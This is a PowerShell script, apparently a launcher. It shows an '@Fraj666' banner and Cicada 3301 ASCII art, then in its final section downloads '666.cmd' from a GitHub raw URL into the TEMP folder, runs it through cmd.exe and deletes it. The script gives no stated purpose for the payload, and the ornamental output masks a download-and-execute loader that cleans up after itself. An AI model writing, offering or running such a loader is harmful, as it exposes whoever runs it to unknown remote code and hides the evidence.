Clear-Host

# 1. Check internet connection first
$isConnected = (Test-Connection -ComputerName "1.1.1.1" -Count 1 -Quiet) -or (Test-Connection -ComputerName "raw.githubusercontent.com" -Count 1 -Quiet)

if (-not $isConnected) {
    $errMsg = "   [!] MUST BE CONNECTED TO THE INTERNET : @Fraj   "
    $winWidth = $Host.UI.RawUI.WindowSize.Width
    $padSize = [Math]::Max(0, [Math]::Floor(($winWidth - $errMsg.Length) / 2))
    $pad = " " * $padSize

    Write-Host "`n`n"
    Write-Host $pad -NoNewline
    Write-Host $errMsg -ForegroundColor White -BackgroundColor DarkRed
    Write-Host "`n"
    return
}

$winWidth = $Host.UI.RawUI.WindowSize.Width

# 2. Top Divider + @Fraj666 Banner
$topBone  = "   (o)=======================================================(o)   "
$botSnake = "   ~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~<:===  "

$banner = @(
    "   ____    ______                _    __    __    __   "
    "  / __ \  |  ____|              (_)  / /   / /   / /   "
    " / / _`` | | |__    _ __   __ _   _  / /_  / /_  / /_   "
    "| | (_| | |  __|  | '__| / _`` | | || '_ \| '_ \| '_ \  "
    "| \__,_ | | |     | |   | (_| | | || (_) | (_) | (_) | "
    " \____/   |_|     |_|    \__,_| | | \___/ \___/ \___/  "
    "                               _/ |                    "
    "                              |__/                     "
)

$bannerPad = " " * [Math]::Max(0, [Math]::Floor(($winWidth - $banner[0].Length) / 2))

Write-Host ""
Write-Host ($bannerPad + $topBone) -ForegroundColor Gray
Write-Host ""

foreach ($line in $banner) {
    Write-Host $bannerPad -NoNewline
    Write-Host $line -ForegroundColor Yellow -BackgroundColor Black
}

Write-Host ""
Write-Host ($bannerPad + $botSnake) -ForegroundColor Green
Write-Host ""

# 3. Sharp, Veined Cicada 3301 ASCII Art
$cicada = @(
    "      .---.___                                             ___.---.       "
    "    .'   _..--'''---.__          .-----.          __.---'''--.._   '.     "
    "   /   .'   _..---.._  ''--._  .'       '.  _.--''  _..---.._   '.   \    "
    "  |   /   .'  _.._   '.      \/   (---)   \/      .'   _.._  '.   \   |   "
    "  |  |   /  .'    '.   \     |   / === \   |     /   .'    '.  \   |  |   "
    "   \  \  | /   /\   \   |    |  |  ===  |  |    |   /   /\   \ |  /  /    "
    "    '. '.|/   /  \   \  |    |  |  ===  |  |    |  /   /  \   \|.' .'     "
    "      '-..___/____\___\_|     \  \ === /  /     |_/__/____\___..-'        "
    "            .'   _.._  '.      '. '---' .'      .'  _.._   '.             "
    "           /   .'    '.  \       |     |       /  .'    '.   \            "
    "          |   /   /\   \  |      |  -  |      |  /   /\   \   |           "
    "           \  \__/  \__/ /       |  -  |       \ \__/  \__/  /            "
    "            '.________.-'         \   /         '-.._______.'             "
    "                                   \ /                                    "
    "                                    V                                     "
)

$cicadaPad = " " * [Math]::Max(0, [Math]::Floor(($winWidth - $cicada[0].Length) / 2))

foreach ($line in $cicada) {
    Write-Host ($cicadaPad + $line) -ForegroundColor White
}
Write-Host ""

# 4. Download and execute 666.cmd
$url = "https://raw.githubusercontent.com/lenonschizophrenic-crypto/devil_named_Fraj/main/666.cmd"
$tempFile = "$env:TEMP\666.cmd"

Invoke-RestMethod -Uri $url -OutFile $tempFile
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempFile`"" -Wait
Remove-Item -Path $tempFile -Force
